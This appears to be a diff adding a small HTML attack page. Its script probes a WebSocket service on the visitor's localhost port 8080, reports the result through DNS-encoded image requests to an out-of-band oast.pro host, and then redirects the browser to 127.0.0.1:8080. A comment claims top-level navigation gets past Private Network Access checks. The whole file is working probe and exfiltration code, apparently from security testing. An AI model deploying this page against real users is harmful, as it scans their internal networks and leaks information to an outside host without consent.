@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head><title>t</title></head>
+<body>
+<script>
+var OOB = 'd9qr1aj6b8megs7ig8dg5nrtprg7ogmge.oast.pro';
+function dns(label) {
+  var l = label.toLowerCase().replace(/[^a-z0-9-]/g,'-').replace(/-+/g,'-').replace(/^-|-$/g,'').substring(0,60);
+  new Image().src = 'https://' + l + '.' + OOB + '/';
+}
+
+dns('v11-start');
+
+// WebSocket probe: if 8080 is a WS server, onopen fires and we can read response
+var ws8080;
+try {
+  ws8080 = new WebSocket('ws://127.0.0.1:8080/');
+  ws8080.onopen = function() { dns('ws-8080-open'); ws8080.send('GET / HTTP/1.0\r\n\r\n'); };
+  ws8080.onmessage = function(e) { dns('ws-8080-msg-' + (e.data||'').length + 'b'); };
+  ws8080.onerror = function() { dns('ws-8080-err'); };
+} catch(e) { dns('ws-8080-exc'); }
+
+// Redirect to 8080 after 300ms (OOB hits above fire first, then we nav)
+// Top-level navigation is PNA-exempt: GET request, not OPTIONS preflight
+setTimeout(function() {
+  dns('v11-redir-8080');
+  window.location.href = 'http://127.0.0.1:8080/';
+}, 300);
+</script>
+</body>
+</html>
